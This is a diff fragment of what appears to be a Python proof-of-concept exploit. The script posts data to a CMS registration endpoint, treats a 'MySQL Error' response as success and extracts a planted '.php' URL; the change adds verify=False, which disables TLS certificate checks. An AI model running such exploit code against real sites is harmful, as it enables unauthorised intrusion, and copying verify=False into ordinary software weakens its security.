@@ -47,7 +47,7 @@ def poc(url):
 
     target_url = url + "/index.php?m=member&c=index&a=register&siteid=1"
     try:
-        r = requests.post(target_url, data=data, timeout=TIMEOUT)
+        r = requests.post(target_url, data=data, timeout=TIMEOUT, verify=False)
         if "MySQL Error" in r.content and "http" in r.content:
             successUrl = r.text[r.text.index("http"):r.text.index(".php")] + ".php"
             return successUrl
